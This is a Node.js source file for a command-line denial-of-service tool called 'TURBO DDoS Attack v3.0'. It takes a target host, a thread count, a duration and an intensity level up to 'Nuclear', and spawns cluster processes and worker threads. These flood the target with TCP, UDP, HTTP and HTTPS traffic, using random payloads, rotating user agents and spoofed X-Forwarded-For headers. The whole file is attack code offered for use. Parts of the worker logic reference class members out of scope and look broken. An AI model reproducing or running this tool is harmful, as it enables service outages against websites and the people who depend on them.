#!/usr/bin/env node
'use strict';

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const chalk = require('chalk');
const dns = require('dns/promises');
const url = require('url');
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const os = require('os');

const colors = {
    title: chalk.bold.hex('#FF4500'),
    prompt: chalk.bold.hex('#32CD32'),
    error: chalk.bold.hex('#FF6347'),
    success: chalk.bold.hex('#7CFC00'),
    warning: chalk.bold.hex('#FFD700'),
    info: chalk.bold.hex('#1E90FF'),
    stat: chalk.bold.hex('#F8F8FF'),
    highlight: chalk.bold.hex('#BA55D3'),
    debug: chalk.hex('#808080')
};

class TurboDDoSAttack {
    constructor() {
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            bandwidth: 0,
            methods: { TCP: 0, UDP: 0, HTTP: 0, HTTPS: 0 }
        };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP', 'HTTPS'];
        this.startTime = Date.now();
        this.statsInterval = null;
        this.payloads = this.generatePayloads();
    }

    generatePayloads() {
        return {
            TCP: crypto.randomBytes(2048),
            UDP: crypto.randomBytes(65507),
            HTTP: Buffer.from(this.generateHttpRequest()),
            HTTPS: Buffer.from(this.generateHttpRequest(true))
        };
    }

    generateHttpRequest(https = false) {
        const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
        const paths = ['/', '/api', '/wp-admin', '/v1/users', '/graphql'];
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
            'curl/7.77.0'
        ];

        const randomMethod = methods[Math.floor(Math.random() * methods.length)];
        const randomPath = paths[Math.floor(Math.random() * paths.length)];
        const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

        return [
            `${randomMethod} ${randomPath}?${crypto.randomBytes(12).toString('hex')} HTTP/1.1`,
            `Host: ${workerData?.target || 'example.com'}`,
            `User-Agent: ${randomUserAgent}`,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Connection: keep-alive',
            'Cache-Control: no-cache',
            `X-Forwarded-For: ${Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.')}`,
            `Content-Length: ${Math.floor(Math.random() * 10000)}`,
            '\r\n'
        ].join('\r\n');
    }

    async start() {
        console.log(colors.title('\nâš¡ TURBO DDoS Attack v3.0 âš¡\n'));
        
        const target = await this.ask(colors.prompt('Target (URL/IP): '));
        const { host, port, protocol } = await this.resolveTarget(target);
        const threads = await this.numberBetween(colors.prompt('Threads (100-10000): '), 100, 10000);
        const duration = await this.numberBetween(colors.prompt('Duration (seconds): '), 10, 86400);
        const intensity = await this.selectIntensity();

        console.log(colors.info(`\nðŸ”¹ Target: ${host}:${port}`));
        console.log(colors.info(`ðŸ”¹ Protocol: ${protocol.toUpperCase()}`));
        console.log(colors.info(`ðŸ”¹ Threads: ${threads}`));
        console.log(colors.info(`ðŸ”¹ Duration: ${duration} seconds`));
        console.log(colors.info(`ðŸ”¹ Intensity: ${intensity}`));

        this.startAttack(host, port, threads, intensity);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    async selectIntensity() {
        console.log('\n' + colors.info('Attack intensity:'));
        console.log(colors.warning('1. Low (steady)'));
        console.log(colors.warning('2. Medium (aggressive)'));
        console.log(colors.warning('3. High (flood)'));
        console.log(colors.warning('4. Nuclear (max power)\n'));

        const choice = await this.numberBetween(colors.prompt('Choice (1-4): '), 1, 4);
        return ['Low', 'Medium', 'High', 'Nuclear'][choice - 1];
    }

    startAttack(target, port, threads, intensity) {
        if (cluster.isMaster) {
            const cpuCount = Math.min(os.cpus().length, 16);
            for (let i = 0; i < cpuCount; i++) {
                cluster.fork();
            }

            cluster.on('exit', (worker) => {
                cluster.fork();
            });
        } else {
            const delay = this.calculateDelay(intensity);
            const workerThreads = Math.ceil(threads / os.cpus().length);

            for (let i = 0; i < workerThreads; i++) {
                const method = this.methods[Math.floor(Math.random() * this.methods.length)];
                const worker = new Worker(__filename, { 
                    workerData: { 
                        target, 
                        port, 
                        method,
                        intensity
                    }
                });
                
                worker.on('message', (msg) => {
                    this.stats.total += msg.total || 0;
                    this.stats.success += msg.success || 0;
                    this.stats.failed += msg.failed || 0;
                    this.stats.bandwidth += msg.bandwidth || 0;
                    if (msg.method) this.stats.methods[msg.method]++;
                });
                
                this.workers.push(worker);
            }
        }
    }

    calculateDelay(intensity) {
        const delays = {
            'Low': 100,
            'Medium': 30,
            'High': 5,
            'Nuclear': 0
        };
        return delays[intensity] || 30;
    }

    showStats() {
        const render = () => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const rps = elapsed > 0 ? (this.stats.total / elapsed).toFixed(0) : 0;
            const bw = (this.stats.bandwidth / (1024 ** 2)).toFixed(2);
            const successRate = this.stats.total > 0 
                ? ((this.stats.success / this.stats.total) * 100).toFixed(1) 
                : '0.0';

            readline.clearLine(process.stdout, 0);
            readline.cursorTo(process.stdout, 0);

            const statsDisplay = [
                colors.highlight(`â±ï¸ ${elapsed.toFixed(1)}s`),
                colors.stat('REQ:') + colors.info(` ${this.stats.total}`),
                colors.stat('OK:') + colors.success(` ${this.stats.success}`),
                colors.stat('FAIL:') + colors.error(` ${this.stats.failed}`),
                colors.stat('RATE:') + colors.warning(` ${successRate}%`),
                colors.stat('RPS:') + colors.highlight(` ${rps}`),
                colors.stat('BW:') + colors.info(` ${bw}MB/s`),
                colors.stat('METHODS:') + colors.debug(` TCP:${this.stats.methods.TCP} UDP:${this.stats.methods.UDP} HTTP:${this.stats.methods.HTTP} HTTPS:${this.stats.methods.HTTPS}`)
            ].join(' | ');

            process.stdout.write(statsDisplay);
        };

        this.statsInterval = setInterval(render, 500);
        render();
    }

    async ask(question) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise(resolve => {
            rl.question(question, answer => {
                rl.close();
                resolve(answer.trim());
            });
        });
    }

    async numberBetween(question, min, max) {
        let num;
        do num = parseInt(await this.ask(question)) || min;
        while (num < min || num > max);
        return num;
    }

    async resolveTarget(input) {
        try {
            const parsed = new url.URL(input.includes('://') ? input : `http://${input}`);
            const resolved = await dns.lookup(parsed.hostname);
            return { 
                host: resolved.address, 
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                protocol: parsed.protocol.replace(':', '')
            };
        } catch {
            console.log(colors.error('\nInvalid target!'));
            process.exit(1);
        }
    }

    stop() {
        clearInterval(this.statsInterval);
        if (cluster.isMaster) {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
        }
        this.workers.forEach(w => w.terminate());
        console.log(colors.success('\nAttack stopped'));
        process.exit();
    }
}

if (!isMainThread) {
    const { target, port, method, intensity } = workerData;
    const delay = this.calculateDelay(intensity);

    const attackMethods = {
        TCP: () => {
            const socket = net.connect(port, target);
            socket.setNoDelay(true);
            socket.on('connect', () => {
                for (let i = 0; i < 5; i++) {
                    socket.write(this.payloads.TCP);
                }
                parentPort.postMessage({ 
                    total: 5, 
                    success: 1, 
                    failed: 0, 
                    bandwidth: this.payloads.TCP.length * 5,
                    method: 'TCP'
                });
                socket.destroy();
            });
            socket.on('error', () => {
                parentPort.postMessage({ 
                    total: 5, 
                    success: 0, 
                    failed: 5, 
                    bandwidth: 0,
                    method: 'TCP'
                });
            });
        },
        UDP: () => {
            const socket = dgram.createSocket('udp4');
            for (let i = 0; i < 10; i++) {
                socket.send(this.payloads.UDP, port, target, (err) => {
                    if (err) return;
                    parentPort.postMessage({ 
                        total: 1, 
                        success: 1, 
                        failed: 0, 
                        bandwidth: this.payloads.UDP.length,
                        method: 'UDP'
                    });
                });
            }
            socket.close();
        },
        HTTP: () => {
            const req = http.request({
                host: target,
                port: port,
                path: `/?${crypto.randomBytes(12).toString('hex')}`,
                method: ['GET', 'POST', 'HEAD'][Math.floor(Math.random() * 3)],
                headers: {
                    'User-Agent': this.generateHttpRequest().split('\r\n')[2].split(': ')[1],
                    'X-Forwarded-For': `${Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.')}`
                }
            }, () => {
                parentPort.postMessage({ 
                    total: 1, 
                    success: 1, 
                    failed: 0, 
                    bandwidth: this.payloads.HTTP.length,
                    method: 'HTTP'
                });
            });
            req.on('error', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    success: 0, 
                    failed: 1, 
                    bandwidth: 0,
                    method: 'HTTP'
                });
            });
            req.end();
        },
        HTTPS: () => {
            const req = https.request({
                host: target,
                port: port,
                path: `/?${crypto.randomBytes(12).toString('hex')}`,
                method: ['GET', 'POST', 'PUT'][Math.floor(Math.random() * 3)],
                rejectUnauthorized: false,
                headers: {
                    'User-Agent': this.generateHttpRequest().split('\r\n')[2].split(': ')[1],
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache'
                }
            }, () => {
                parentPort.postMessage({ 
                    total: 1, 
                    success: 1, 
                    failed: 0, 
                    bandwidth: this.payloads.HTTPS.length,
                    method: 'HTTPS'
                });
            });
            req.on('error', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    success: 0, 
                    failed: 1, 
                    bandwidth: 0,
                    method: 'HTTPS'
                });
            });
            req.end();
        }
    };

    const attack = () => attackMethods[method]();
    if (intensity === 'Nuclear') {
        const nuclearAttack = () => {
            for (let i = 0; i < 5; i++) attack();
        };
        setInterval(nuclearAttack, 1);
    } else {
        setInterval(attack, delay);
    }
}

if (isMainThread && !cluster.isWorker) {
    new TurboDDoSAttack().start();
}